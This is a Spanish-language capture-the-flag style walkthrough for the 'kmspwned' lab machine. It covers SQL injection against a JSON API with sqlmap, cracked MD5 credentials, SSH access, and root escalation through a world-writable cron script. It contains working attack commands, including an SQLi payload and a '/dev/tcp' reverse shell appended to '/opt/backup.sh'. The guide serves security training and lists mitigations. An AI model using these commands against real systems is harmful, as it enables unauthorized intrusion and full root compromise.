# DockerLabs — kmspwned: Guía del laboratorio

## Resumen
kmspwned es una máquina Linux vulnerable diseñada para practicar técnicas de reconocimiento, explotación de inyección SQL en una API JSON, acceso por SSH y escalada de privilegios mediante la modificación de un script de backup ejecutado por cron.

Objetivos del laboratorio:
- Realizar reconocimiento de la máquina objetivo.
- Encontrar y explotar una inyección SQL en una API JSON.
- Obtener credenciales administrativas desde la base de datos.
- Acceder al sistema por SSH usando credenciales obtenidas.
- Escalar privilegios a root modificando un script ejecutado por cron.

Nivel: Intermedio  
Duración estimada: 45–90 minutos

---

## Requisitos
- Entorno para ejecutar la imagen de la máquina (máquina local/VM).
- Kali Linux u otra máquina atacante con:
  - nmap
  - Burp Suite (o proxy HTTP)
  - sqlmap
  - netcat (nc)
  - un editor de texto (nano, vim)
- Conexión de red entre atacante y víctima (la guía asume IPs de laboratorio; actualízalas según tu entorno).
- Archivo de la máquina: `kmspwned.zip` (descarga por Mega según la nota original).

Atacante (ejemplo): 10.0.2.15  
Víctima (ejemplo): 172.17.0.2

---

## Despliegue de la máquina vulnerable

1. Descarga y descomprime el paquete:
   ```bash
   unzip kmspwned.zip
   ```
   Obtendrás al menos:
   - `auto_deploy.sh`
   - `kmspwned.tar`

2. Concede permisos de ejecución al script de despliegue:
   ```bash
   chmod +x auto_deploy.sh
   ```

3. Despliega la máquina:
   ```bash
   ./auto_deploy.sh kmspwned.tar
   ```

Notas:
- El script `auto_deploy.sh` suele lanzar la VM o contenedor con la IP 172.17.0.2 (ajusta si tu entorno asigna otra IP).
- Si usas VirtualBox/VMWare/Docker, adapta el despliegue a tu entorno.

---

## Fase 1 — Descubrimiento (Reconocimiento)

Escanea la máquina conocida (ejemplo 172.17.0.2) con Nmap:
```bash
nmap -sC -sV -T5 172.17.0.2
```
- `-sC`: scripts predeterminados
- `-sV`: detección de versión
- `-T5`: temporización agresiva (usar con precaución fuera de un laboratorio)

Resultados esperados:
- Puerto 22/tcp: SSH
- Puerto 80/tcp: HTTP (aplicación web)

Accede al puerto 80 desde un navegador para inspeccionar la aplicación web.

---

## Fase 2 — Enumeración de la aplicación web

1. Revisa el código fuente de la página web (Ctrl+U) y busca comentarios que oculten rutas o endpoints. En este lab se detecta un comentario que apunta al panel de administración en `/admin/`.

2. Crea una cuenta de usuario desde el formulario de registro y haz login para explorar funcionalidades disponibles a usuarios autenticados.

3. Observa el verificador de extensiones de dominio (input). Prueba con payloads simples para detectar vulnerabilidades, por ejemplo:
   - `' OR 1=1-- -`
   Si la búsqueda devuelve resultados que no deberían aparecer, esto sugiere una posible inyección SQL.

4. Inspecciona las peticiones HTTP realizadas por la página (DevTools > Network). Encontrarás una petición POST JSON a `/lib/kms_api.php` con un campo `extension` que se envía desde `fetch()` en JavaScript.

---

## Fase 3 — Explotación de SQL Injection (API JSON)

Herramientas: Burp Suite y sqlmap.

1. Configura el navegador para usar Burp Suite como proxy (ejemplo):
   - Proxy: 172.17.0.1
   - Puerto: 8080

2. En Burp, activa "Intercept" y realiza una búsqueda desde la aplicación para capturar una petición legítima al endpoint `/lib/kms_api.php`. Conserva la cookie de sesión y cabezeras.

3. Guarda la petición completa en un fichero `peti.txt` (por ejemplo usando `nano peti.txt`) con el formato HTTP completo (request line, headers, body).

4. Lanza sqlmap usando la petición guardada:
   ```bash
   sqlmap -r peti.txt --batch --dump
   ```
   - `-r peti.txt`: cargar petición desde archivo
   - `--batch`: respuestas automáticas
   - `--dump`: extracción de datos

sqlmap detectará que el parámetro JSON `extension` es vulnerable y puede explotar mediante:
- Time-based blind (ej. SLEEP())
- UNION query (para recuperar datos)

Resultados típicos:
- Base de datos `servicloud_erp`
- Tablas encontradas: `sc_clientes`, `sc_extensiones`, `sc_flags`, `sc_facturas`, `sc_notas`, `web_usuarios`, `sc_usuarios`
- Contenido interesante:
  - Notas internas en `sc_notas` indicando la ruta `/admin/` y ` /opt/backup.sh`.
  - Hashes MD5 en `sc_usuarios`, que sqlmap crackea (basado en diccionarios) y revela contraseñas:
    - admin: chocolate
    - carlos: password1
    - ana: ana1234

---

## Fase 4 — Acceso al panel de administración y ejecución de comandos

1. Con las credenciales `admin:chocolate`, accede a `/admin/`.

2. El panel de administración incluye una consola de diagnóstico que permite ejecutar comandos del sistema. Desde esa consola, lista usuarios locales:
   ```bash
   cat /etc/passwd
   ```
   Observa al usuario `carlos` (coincide con la cuenta encontrada en la base de datos).

3. Intenta acceder por SSH desde tu máquina atacante con las credenciales obtenidas:
   ```bash
   ssh carlos@172.17.0.2
   ```
   Si `password1` es válida, iniciarás sesión como `carlos`.

Verifica el ID y grupos:
```bash
id
```
Confirmarás que `carlos` es un usuario sin privilegios.

---

## Fase 5 — Escalada de privilegios (privilege escalation)

1. En la nota de la base de datos se mencionó `/opt/backup.sh`. Revisa permisos y contenido:
```bash
ls -la /opt
cat /opt/backup.sh
```
- Observación típica: `backup.sh` pertenece a root y tiene permisos `-rwxrwxrwx` (777) — cualquiera puede modificarlo.

2. Revisa `crontab` global:
```bash
cat /etc/crontab
```
Se encuentra una línea como:
```
* * * * * root /opt/backup.sh
```
Esto indica que `backup.sh` se ejecuta cada minuto como root. Si el archivo es modificable por usuarios no root, es explotable.

3. Explotación práctica:
- Crea una reverse shell y añádela al final de `/opt/backup.sh` (como usuario `carlos`) — por ejemplo:
```bash
echo "sh -i >& /dev/tcp/10.0.2.15/4444 0>&1" >> /opt/backup.sh
```
Ajusta la IP `10.0.2.15` a la IP de tu máquina atacante.

4. En tu máquina atacante, inicia un listener:
```bash
nc -lvnp 4444
```
- Espera a que cron ejecute el script (en el siguiente minuto). Entonces la víctima abrirá la conexión y obtendrás una shell con UID=0 (root), ya que cron ejecuta el script como root.

5. Comprueba privilegios en la reverse shell:
```bash
id
whoami
```

---

## Limpieza (opcional)
- Elimina la reverse shell del script:
```bash
# como root (si deseas limpiar)
sed -i '/rev-shell-or-pattern/d' /opt/backup.sh
```
- Quita cualquier listener/servicio que hayas creado en tu máquina atacante.
- Apaga o restaura la VM vulnerable si es necesario.

---

## Comprobaciones y banderas
- La máquina suele incluir flags en la DB (tabla `sc_flags`) o ficheros del sistema. Busca en:
  - Base de datos (`sc_flags`)
  - Ficheros en `/root/` tras escalar a root

---

## Buenas prácticas y mitigaciones (para administradores)
- Nunca otorgues permisos de escritura global (777) a scripts que se ejecutan como root.
- Validar y sanitizar todas las entradas que llegan al servidor (incluyendo JSON).
- Proteger endpoints administrativos y limitar el acceso.
- Uso de hashing seguro para contraseñas (bcrypt/argon2 en lugar de MD5).
- Evitar ejecución de comandos del sistema desde interfaces web sin control y escape apropiado.
- Configurar cron y scripts con permisos adecuados y revisar integridad mediante herramientas (AIDE, tripwire).

---

## Recursos y referencias
- Nmap: https://nmap.org
- sqlmap: https://sqlmap.org
- Burp Suite: https://portswigger.net/burp
- Listas de verificación de hardening y mitigaciones para cron y scripts

---

## Resultado esperado (resumen)
1. Reconocimiento: identificar servicios (SSH, HTTP).
2. Enumeración web: encontrar panel /admin/ y endpoint vulnerable.
3. Explotación SQLi: extraer credenciales administrativas.
4. Acceso por SSH como `carlos`.
5. Escalada a root aprovechando `/opt/backup.sh` con permisos 777 y tarea cron ejecutada como root.

--- 

Advertencia: Realiza estas pruebas únicamente en entornos controlados y con autorización; muchas técnicas descritas son intrusivas y dañinas si se aplican a sistemas de terceros sin permiso.